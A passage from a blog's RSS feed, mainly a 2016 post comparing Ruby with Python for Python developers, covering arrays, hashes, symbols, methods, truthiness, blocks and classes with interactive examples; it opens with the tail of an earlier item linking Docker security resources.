&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.docker.com/engine/security/security/&#34;&gt;https://docs.docker.com/engine/security/security/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/riyazdf/dockercon-workshop/tree/master/capabilities&#34;&gt;https://github.com/riyazdf/dockercon-workshop/tree/master/capabilities&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/riyazdf/dockercon-workshop/tree/master/apparmor&#34;&gt;https://github.com/riyazdf/dockercon-workshop/tree/master/apparmor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/riyazdf/dockercon-workshop/tree/master/seccomp&#34;&gt;https://github.com/riyazdf/dockercon-workshop/tree/master/seccomp&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Ruby for Pythonistas</title>
      <link>http://blog.idempotent.ca/2016/05/31/ruby-for-pythonistas/</link>
      <pubDate>Tue, 31 May 2016 23:04:13 -0400</pubDate>
      
      <guid>http://blog.idempotent.ca/2016/05/31/ruby-for-pythonistas/</guid>
      <description>

&lt;p&gt;It&amp;rsquo;s been 11 years since I first encountered Python, and it&amp;rsquo;s been my favourite programming language ever since. However, I&amp;rsquo;ve always been curious about the Ruby language. On the surface, they have a lot in common: both dynamic, object-oriented, interpreted, vm-based, and optimize for developer happiness rather than machine speed. However, they have quite different data models, syntax and community culture.&lt;/p&gt;

&lt;p&gt;This post is a summary of my journey learning Ruby as a seasoned Python developer, and my thoughts comparing these two popular languages.&lt;/p&gt;

&lt;p&gt;Disclaimer:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;I&amp;rsquo;m by no means a Ruby expert. My understand of Ruby so far has been quite superficial.&lt;/li&gt;
&lt;li&gt;Most of the points here are my notes while going through the excellent &lt;a href=&#34;http://rubykoans.com/&#34;&gt;Ruby Koan&lt;/a&gt; exercises. A big shout out to them!&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;arrays&#34;&gt;Arrays&lt;/h1&gt;

&lt;p&gt;In my opinion, Ruby arrays are a lot richer than Python lists.&lt;/p&gt;

&lt;h2 id=&#34;concatenation&#34;&gt;Concatenation&lt;/h2&gt;

&lt;p&gt;Use the &lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt; operator on arrays:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;a &amp;lt;&amp;lt; 3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;in Python:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;a.append(3)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;access&#34;&gt;Access&lt;/h2&gt;

&lt;p&gt;To access an array, you can use the array index just like it is in almost every other language. However, Ruby&amp;rsquo;s &lt;code&gt;Array&lt;/code&gt; class also implements convenient methods to access the first and last element of the array:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):004:0&amp;gt; a = [1, 2, :three]
=&amp;gt; [1, 2, :three]
irb(main):005:0&amp;gt; a[0]
=&amp;gt; 1
irb(main):006:0&amp;gt; a[-1]
=&amp;gt; :three
irb(main):007:0&amp;gt; a.last
=&amp;gt; :three
irb(main):008:0&amp;gt; a.first
=&amp;gt; 1
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;slices-and-ranges&#34;&gt;Slices and Ranges&lt;/h2&gt;

&lt;p&gt;Both Python and Ruby support slicing although the syntax are slightly different:&lt;/p&gt;

&lt;p&gt;Ruby: &lt;code&gt;arr[a, b]&lt;/code&gt;, where &lt;code&gt;a&lt;/code&gt; is the starting index and &lt;code&gt;b&lt;/code&gt; is the size of the slice.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):012:0&amp;gt; a=[:one, :two, :three]
=&amp;gt; [:one, :two, :three]
irb(main):013:0&amp;gt; a[0,1]
=&amp;gt; [:one]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Python: &lt;code&gt;arr[a:b]&lt;/code&gt;, where &lt;code&gt;a&lt;/code&gt; is the starting index and &lt;code&gt;b&lt;/code&gt; is the ending index (exclusive)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; a=[1,2,3]
&amp;gt;&amp;gt;&amp;gt; a[0:1]
[1]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Python has &lt;code&gt;range&lt;/code&gt; and &lt;code&gt;xrange&lt;/code&gt; builtin functions.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; list(range(10))
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ruby also has range, but it provides language construct for &lt;code&gt;Range&lt;/code&gt; objects:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):010:0&amp;gt; (1..5).to_a
=&amp;gt; [1, 2, 3, 4, 5]

irb(main):011:0&amp;gt; (1...5).to_a
=&amp;gt; [1, 2, 3, 4]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It&amp;rsquo;s worth noting that double dot (&lt;code&gt;..&lt;/code&gt;) creates an inclusive interval whereas triple dot (&lt;code&gt;...&lt;/code&gt;) creates an exclusive interval. This threw me off at first, since somehow my brain associate &lt;code&gt;...&lt;/code&gt; with inclusive and &lt;code&gt;..&lt;/code&gt; being exclusive.&lt;/p&gt;

&lt;p&gt;In Ruby, you can also pass a range object to an array, and that behaves more or less the same way as Python&amp;rsquo;s slicing:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):019:0&amp;gt; a[1...3]
=&amp;gt; [:two, :three]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Python&amp;rsquo;s slicing is also pretty flexible. Python&amp;rsquo;s special method &lt;code&gt;__getitem__&lt;/code&gt; is able to take a range object (or any object for that matter) and override the behaviour of &lt;code&gt;[]&lt;/code&gt; operator.&lt;/p&gt;

&lt;h2 id=&#34;unpacking&#34;&gt;Unpacking&lt;/h2&gt;

&lt;p&gt;One of the nice features of Python is list/tuple unpacking, e.g.,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; a=[&#39;one&#39;, &#39;two&#39;]
&amp;gt;&amp;gt;&amp;gt; one, two = a
&amp;gt;&amp;gt;&amp;gt; one
&#39;one&#39;
&amp;gt;&amp;gt;&amp;gt; two
&#39;two&#39;
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;IMO, Ruby does it better.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):020:0&amp;gt; a=[:one, :two]
=&amp;gt; [:one, :two]
irb(main):021:0&amp;gt; one, two = a
=&amp;gt; [:one, :two]
irb(main):022:0&amp;gt; one
=&amp;gt; :one
irb(main):023:0&amp;gt; two
=&amp;gt; :two
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Left side doesn&amp;rsquo;t have to match the right side cardinally:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):024:0&amp;gt; one, two = [1, 2, 3, 4, 5]
=&amp;gt; [1, 2, 3, 4, 5]
irb(main):025:0&amp;gt; one
=&amp;gt; 1
irb(main):026:0&amp;gt; two
=&amp;gt; 2

irb(main):027:0&amp;gt; one, two = [1]
=&amp;gt; [1]
irb(main):029:0&amp;gt; one
=&amp;gt; 1
irb(main):030:0&amp;gt; two
=&amp;gt; nil
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In Python, that&amp;rsquo;s a &lt;code&gt;ValueError&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; one, two = [1,2,3,4,5]
Traceback (most recent call last):
  File &amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
  ValueError: too many values to unpack (expected 2)

&amp;gt;&amp;gt;&amp;gt; one, two = [1]
Traceback (most recent call last):
  File &amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
  ValueError: not enough values to unpack (expected 2, got 1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ruby also supports &amp;ldquo;wildcard&amp;rdquo; match which in Python-land is only available after Python 3.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):031:0&amp;gt; first, *rest = [1,2,3,4,5]
=&amp;gt; [1, 2, 3, 4, 5]
irb(main):032:0&amp;gt; first
=&amp;gt; 1
irb(main):033:0&amp;gt; rest
=&amp;gt; [2, 3, 4, 5]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Both Languages support inline swapping:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):034:0&amp;gt; a, b = [1, 3]
=&amp;gt; [1, 3]
irb(main):035:0&amp;gt; a, b = b, a
=&amp;gt; [3, 1]
irb(main):036:0&amp;gt; a
=&amp;gt; 3
irb(main):037:0&amp;gt; b
=&amp;gt; 1
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;hashes&#34;&gt;Hashes&lt;/h1&gt;

&lt;p&gt;Ruby hashes are equivalent of Python dictionaries. They can be constructed and accessed using similar syntax.&lt;/p&gt;

&lt;h2 id=&#34;no-keyerror&#34;&gt;No &lt;code&gt;KeyError&lt;/code&gt;&lt;/h2&gt;

&lt;p&gt;In Python, when accessing a key that doesn&amp;rsquo;t exist in the dictionary, you get a &lt;code&gt;KeyError&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; x={&#39;a&#39;: 1}
&amp;gt;&amp;gt;&amp;gt; x[&#39;b&#39;]
Traceback (most recent call last):
  File &amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
  KeyError: &#39;b&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In Ruby, you simply get &lt;code&gt;nil&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):038:0&amp;gt; a={:a =&amp;gt; 1, :b =&amp;gt; 2}
=&amp;gt; {:a=&amp;gt;1, :b=&amp;gt;2}
irb(main):039:0&amp;gt; a[:c]
=&amp;gt; nil
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, doing a &lt;code&gt;fetch&lt;/code&gt; will result in &lt;code&gt;KeyError&lt;/code&gt; if it doesn&amp;rsquo;t exist:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):040:0&amp;gt; a.fetch(:c)
KeyError: key not found: :c
    from (irb):40:in `fetch&#39;
    from (irb):40
    from /usr/bin/irb:11:in `&amp;lt;main&amp;gt;&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;default-value&#34;&gt;Default value&lt;/h2&gt;

&lt;p&gt;In Ruby, default value functionality is built-in with &lt;code&gt;Hash&lt;/code&gt; class:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):041:0&amp;gt; x=Hash.new([])
=&amp;gt; {}
irb(main):042:0&amp;gt; x[:one]
=&amp;gt; []
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In Python, we use &lt;code&gt;collections.defaultdict&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import collections
&amp;gt;&amp;gt;&amp;gt; x=collections.defaultdict(list)
&amp;gt;&amp;gt;&amp;gt; x[&amp;quot;one&amp;quot;]
[]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Python&amp;rsquo;s &lt;code&gt;defaultdict&lt;/code&gt; is more flexible, allowing the default value be obtained via a callable. Maybe there&amp;rsquo;s a way to achieve the same thing with Ruby but I haven&amp;rsquo;t found it.&lt;/p&gt;

&lt;p&gt;Gotcha: The default value in Ruby&amp;rsquo;s &lt;code&gt;Hash&lt;/code&gt; though is shared among all instances:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):043:0&amp;gt; x=Hash.new([])
=&amp;gt; {}
irb(main):044:0&amp;gt; x[:one] &amp;lt;&amp;lt; &amp;quot;1&amp;quot;
=&amp;gt; [&amp;quot;1&amp;quot;]
irb(main):045:0&amp;gt; x[:two] &amp;lt;&amp;lt; &amp;quot;2&amp;quot;
=&amp;gt; [&amp;quot;1&amp;quot;, &amp;quot;2&amp;quot;]
irb(main):046:0&amp;gt; x[:two]
=&amp;gt; [&amp;quot;1&amp;quot;, &amp;quot;2&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This could lead to subtle bugs if not careful.&lt;/p&gt;

&lt;p&gt;A safer approach is to use block initialization:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):047:0&amp;gt; x=Hash.new { |hash, key| hash[key] = [] }
=&amp;gt; {}
irb(main):048:0&amp;gt; x[:one] &amp;lt;&amp;lt; 1
=&amp;gt; [1]
irb(main):049:0&amp;gt; x[:two] &amp;lt;&amp;lt; 2
=&amp;gt; [2]
irb(main):050:0&amp;gt; x[:two]
=&amp;gt; [2]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&#34;http://rubylearning.com/satishtalim/ruby_blocks.html&#34;&gt;Block&lt;/a&gt; is one of my favourite Ruby language features.&lt;/p&gt;

&lt;h1 id=&#34;strings&#34;&gt;Strings&lt;/h1&gt;

&lt;p&gt;Strings are similar in both languages, except Ruby strings are mutable, while Pythons&amp;rsquo; are immutable. Ruby also has more ways to escape quotes:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):051:0&amp;gt; %(I can use &#39; and &amp;quot; here no problem)
=&amp;gt; &amp;quot;I can use &#39; and \&amp;quot; here no problem&amp;quot;

irb(main):052:0&amp;gt; %!and here &#39;&amp;quot;!
=&amp;gt; &amp;quot;and here &#39;\&amp;quot;&amp;quot;

irb(main):053:0&amp;gt; %{or here &#39;&amp;quot;}
=&amp;gt; &amp;quot;or here &#39;\&amp;quot;&amp;quot;

irb(main):054:0&amp;gt; %{multi
irb(main):055:0&amp;quot; line
irb(main):056:0&amp;quot; strings%}
=&amp;gt; &amp;quot;multi\nline\nstrings%&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can use regex as string index to extract the matched substring:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):065:0&amp;gt; &amp;quot;j&#39;ai 34 ans&amp;quot;[/\d+/]
=&amp;gt; &amp;quot;34&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;symbols&#34;&gt;Symbols&lt;/h1&gt;

&lt;p&gt;Symbols are a unique in Ruby that&amp;rsquo;s not present in Python (although I wish). It has permeated into the design of other modern languages, like Clojure and Elixir. You can think of symbols as a way to do free-form enums, a way to name something, as oppose to just some free form texts.&lt;/p&gt;

&lt;p&gt;You can get all symbols in the current scope:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):060:0&amp;gt; Symbol.all_symbols
[... long list of global symbols ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can use symbols to refer to functions:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):062:0&amp;gt; &#39;&#39;.respond_to? :to_i
=&amp;gt; true
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can dynamically create a symbol from strings:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):063:0&amp;gt; &#39;abc&#39;.to_sym
=&amp;gt; :abc
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;methods&#34;&gt;Methods&lt;/h1&gt;

&lt;h2 id=&#34;default-values&#34;&gt;Default values&lt;/h2&gt;

&lt;p&gt;Same as Python:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;def foo(a, b=&#39;default&#39;) 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;variadic-arguments&#34;&gt;Variadic arguments&lt;/h2&gt;

&lt;p&gt;Same as Python:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;def foo(a, *c)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Inside the method, &lt;code&gt;c&lt;/code&gt; is available as an &lt;code&gt;Array&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;invocation-and-return&#34;&gt;Invocation and Return&lt;/h2&gt;

&lt;p&gt;Ruby method invocation does not require parentheses, unless it&amp;rsquo;s it results in ambiguity. e.g., you can omit parens in:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;def foo(arg)
  ...
end

foo :bar
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;but you have to use parens to disambiguate in situations like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;def foo(arg)
end

def bar(arg)
end

bar(foo arg)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In Python, parens are mandatory.&lt;/p&gt;

&lt;p&gt;In Ruby, almost everything is an expression. In the case of a method definition, the last expression becomes the return value of the method. Some people call it implicit returns, and people have mixed feelings about it. Personally I like the everything-is-an-expression model and using the last expression as the return value feels natural. In Python, you have to use &lt;code&gt;return&lt;/code&gt;, otherwise, it implicitly returns &lt;code&gt;None&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;keyword-arguments&#34;&gt;Keyword arguments&lt;/h2&gt;

&lt;p&gt;Ruby 1.x doesn&amp;rsquo;t have keyword arguments as a language feature. This is a little disappointing. However, it&amp;rsquo;s idiomatic in Ruby to have a method accept a hash, and use symbols to simulate keyword arguments:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):068:0&amp;gt; def foo(args)
irb(main):069:1&amp;gt;   puts args
irb(main):070:1&amp;gt; end
=&amp;gt; :foo
irb(main):071:0&amp;gt; foo(a: 5, b: 6)
{:a=&amp;gt;5, :b=&amp;gt;6}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Since you can omit &lt;code&gt;{}&lt;/code&gt; in Hash construction, this code is almost like Python&amp;rsquo;s keyword arguments. However, you have to do argument validation yourself.&lt;/p&gt;

&lt;p&gt;In Ruby 2.x, this pattern has been elevated as a language feature, so now Ruby has proper keyword argument support. However, I have not seen an equivalent of Python&amp;rsquo;s &lt;a href=&#34;https://www.python.org/dev/peps/pep-3102/&#34;&gt;keyword-only argument&lt;/a&gt; feature.&lt;/p&gt;

&lt;h1 id=&#34;constants&#34;&gt;Constants&lt;/h1&gt;

&lt;p&gt;Ruby symbols start with capital letters are &amp;ldquo;constants&amp;rdquo;, so classes are also &amp;ldquo;constants&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):074:0&amp;gt; class foo
irb(main):075:1&amp;gt; end
SyntaxError: (irb):74: class/module name must be CONSTANT
        from /usr/bin/irb:11:in `&amp;lt;main&amp;gt;&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ruby constants are more enforced than their counterpart in Python. (well, technically, Python doesn&amp;rsquo;t have constants, only by convention, all cap symbols are considered constants.)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):076:0&amp;gt; A=1
=&amp;gt; 1
irb(main):077:0&amp;gt; A=2
(irb):77: warning: already initialized constant A
(irb):76: warning: previous definition of A was here
=&amp;gt; 2
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;truthiness&#34;&gt;Truthiness&lt;/h1&gt;

&lt;p&gt;Truthiness in Ruby is a lot different from Python. Python has the concept of &amp;ldquo;falsy&amp;rdquo;, in which &lt;code&gt;0&lt;/code&gt;, &lt;code&gt;[]&lt;/code&gt;, &lt;code&gt;{}&lt;/code&gt;, &lt;code&gt;&#39;&#39;&lt;/code&gt; are all evaluated to &lt;code&gt;False&lt;/code&gt;. In Ruby, however, only &lt;code&gt;false&lt;/code&gt; is false, and everything else is treated as &lt;code&gt;true&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;def is_true?(value)
  if value
    :true
  else
    :false
  end
end

irb(main):098:0&amp;gt; is_true? 0
=&amp;gt; :true
irb(main):099:0&amp;gt; is_true? &#39;0&#39;
=&amp;gt; :true
irb(main):100:0&amp;gt; is_true? &#39;&#39;
=&amp;gt; :true
irb(main):101:0&amp;gt; is_true? []
=&amp;gt; :true
irb(main):103:0&amp;gt; is_true?({})
=&amp;gt; :true
irb(main):104:0&amp;gt; is_true?(false)
=&amp;gt; :false
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;exceptions&#34;&gt;Exceptions&lt;/h1&gt;

&lt;p&gt;Ruby&amp;rsquo;s exception hierarchy is a lot like Python&amp;rsquo;s, at least in name:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;RuntimeError &amp;lt; StandardError &amp;lt; Exception
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To handle exceptions, you use &lt;code&gt;begin...rescue...ensure&lt;/code&gt; rather than &lt;code&gt;try...except...finally&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&#34;map-reduce-filter&#34;&gt;Map/Reduce/Filter&lt;/h1&gt;

&lt;p&gt;Ruby the language itself is not a functional language, although it provides machinery for you to program in a functional way, such as using high-order functions.&lt;/p&gt;

&lt;p&gt;When first learning Ruby, I was looking for my familiar friends &lt;code&gt;map&lt;/code&gt;/&lt;code&gt;reduce&lt;/code&gt;/&lt;code&gt;filter&lt;/code&gt; but couldn&amp;rsquo;t find any. Then I realized they&amp;rsquo;re called something completely different:&lt;/p&gt;

&lt;p&gt;In Ruby, &lt;code&gt;filter&lt;/code&gt; is achieved using &lt;code&gt;select&lt;/code&gt;/&lt;code&gt;find_all&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):105:0&amp;gt; [1,2,3,4,5].select { |x| x % 2 == 0 }
=&amp;gt; [2, 4]
irb(main):106:0&amp;gt; [1,2,3,4,5].find_all { |x| x % 2 == 0 }
=&amp;gt; [2, 4]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;map&lt;/code&gt; is equivalent to &lt;code&gt;collect&lt;/code&gt;/&lt;code&gt;map&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):107:0&amp;gt; [1,2,3,4,5].collect { |x| x * 2 }
=&amp;gt; [2, 4, 6, 8, 10]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;reduce&lt;/code&gt; is not &lt;code&gt;reduce&lt;/code&gt;, nor is it called &lt;code&gt;fold&lt;/code&gt;, but is weirdly named &lt;code&gt;inject&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;irb(main):108:0&amp;gt; [1,2,3,4,5].inject(0) { |x, y| x + y }
=&amp;gt; 15
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;blocks&#34;&gt;Blocks&lt;/h1&gt;

&lt;p&gt;As I eluded to before, blocks are one of my favourite Ruby language features. It&amp;rsquo;s comparable to Python&amp;rsquo;s &lt;a href=&#34;https://docs.python.org/2/reference/compound_stmts.html#with&#34;&gt;context managers&lt;/a&gt;, but it can be invoked without using a keyword and can be added to any method calls. It feels more natural.&lt;/p&gt;

&lt;p&gt;Similar to Python (using &lt;code&gt;contextlib.contextmanager&lt;/code&gt;), you can invoke a block by &lt;code&gt;yield&lt;/code&gt; to the caller:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;def do_with_logging
    log &amp;quot;start&amp;quot;
    yield
    log &amp;quot;end&amp;quot;
end

do_with_logging {
    # serious business
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A Ruby method is also able to determine if it&amp;rsquo;s called with a block being passed by using &lt;code&gt;block_given?&lt;/code&gt; method.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;def do_it
    if block_given?
        yield
    else
        put &amp;quot;no block&amp;quot;
    end
end
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;classes&#34;&gt;Classes&lt;/h1&gt;

&lt;p&gt;Ruby classes are defined in a similar way as Python.&lt;/p&gt;

&lt;h2 id=&#34;self&#34;&gt;self&lt;/h2&gt;

&lt;p&gt;Ruby&amp;rsquo;s &lt;code&gt;self&lt;/code&gt; can reference different things in different scopes. For example, inside a class definition, &lt;code&gt;self&lt;/code&gt; refers to the class object (kind of like when you define a &lt;code&gt;classmethod&lt;/code&gt; in Python), but inside an instance method, &lt;code&gt;self&lt;/code&gt; refers to the instance of the class.&lt;/p&gt;

&lt;h2 id=&#34;private&#34;&gt;private&lt;/h2&gt;

&lt;p&gt;Python doesn&amp;rsquo;t have &lt;code&gt;private&lt;/code&gt; members or methods. With Ruby however, you &lt;em&gt;can&lt;/em&gt; define &amp;ldquo;private&amp;rdquo; methods if you put &lt;code&gt;private&lt;/code&gt; in front of your method definition.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;class Foo
    private def foo
        puts &amp;quot;private&amp;quot;
    end
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Outside callers can&amp;rsquo;t call &lt;code&gt;foo&lt;/code&gt;. Members of the same class can call &lt;code&gt;foo&lt;/code&gt; if only it is called with &lt;code&gt;self&lt;/code&gt; being the implicit receiver:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;class Foo
    private ...

    def use_foo
        foo  # this is fine
        self.foo  # Not allowed
    end
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ruby&amp;rsquo;s instance variables are private with &lt;code&gt;@&lt;/code&gt; prefix:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;class Foo
    def initialize(name)
        @name = name
    end
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To access &lt;code&gt;@name&lt;/code&gt; you can define getters and/or settings:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;class Foo
    attr_accessor :name
    # or attr_reader :name to make it readonly
    ...
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Although the &lt;code&gt;private&lt;/code&gt; restriction can be circumvented by metaprogramming:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;foo = Foo.new
foo.instance_variable_get(&amp;quot;@name&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Overall, I think Ruby encourages more encapsulation and better design.&lt;/p&gt;

&lt;h2 id=&#34;define-class-methods&#34;&gt;Define class methods&lt;/h2&gt;

&lt;p&gt;You can refer to the class by name when defining methods to make class methods:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;class Foo
    def Foo.bar
    end
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Alternatively, remember we said before that &lt;code&gt;self&lt;/code&gt; inside a class definition refers to the class itself? So this works too:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;class Foo
    def self.bar
    end
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Another way to write class method uses an inner class:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;class Foo
    class &amp;lt;&amp;lt; self
        def bar
        end
    end
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is good if you want to group class methods together.&lt;/p&gt;

&lt;h2 id=&#34;open-class&#34;&gt;Open class&lt;/h2&gt;

&lt;p&gt;A powerful (yet controversial) feature of Ruby is that you can &amp;ldquo;amend&amp;rdquo; any Ruby classes (even the builtin ones) during runtime. It&amp;rsquo;s like monkey-patching on steroids.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;class ::Integer
    def even?
        self % 2 == 0
    end
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now suddenly &lt;code&gt;2.even?&lt;/code&gt; is a thing. It certainly makes writing your own DSL a lot easier, but it may lead to magical code that&amp;rsquo;s hard to track down.&lt;/p&gt;

&lt;h2 id=&#34;inheritance&#34;&gt;Inheritance&lt;/h2&gt;

&lt;p&gt;Ruby uses &lt;code&gt;A &amp;lt; B&lt;/code&gt; to mean class &lt;code&gt;A&lt;/code&gt; inherits from class &lt;code&gt;B&lt;/code&gt;. &lt;code&gt;super&lt;/code&gt; is available to refer to the same-named methods in the super class. Because Ruby is single inheritance, there&amp;rsquo;s no ambiguity of &lt;code&gt;super&lt;/code&gt; here.&lt;/p&gt;

&lt;h2 id=&#34;mixin&#34;&gt;Mixin&lt;/h2&gt;

&lt;p&gt;Ruby&amp;rsquo;s class can only have a single parent, but you can &amp;ldquo;mixin&amp;rdquo; behaviour into your class by &lt;code&gt;include&lt;/code&gt; other modules. Compared to Python, which does support multiple inheritance, and extra attention has to be paid to avoid diamond inheritance problem.&lt;/p&gt;

&lt;p&gt;I feel the Ruby design is more thought-out. As oppose to give more ropes to developers to hang themselves, it makes the use case of multiple inheritance more clear (only for mixins).&lt;/p&gt;

&lt;h1 id=&#34;message-passing&#34;&gt;Message Passing&lt;/h1&gt;

&lt;p&gt;Ruby&amp;rsquo;s object-oriented model is based on the idea of message passing. As opposed to invoking using &lt;code&gt;obj.method&lt;/code&gt;, you can pass a message &lt;code&gt;method&lt;/code&gt; to object &lt;code&gt;obj&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;obj.send :method

obj.__send__ :method
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Use &lt;code&gt;respond_to?&lt;/code&gt; to test if a receiver can handle such message:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if obj.respond_to? :method
    ...
end
&lt;/code&gt;&lt;/pre&gt;

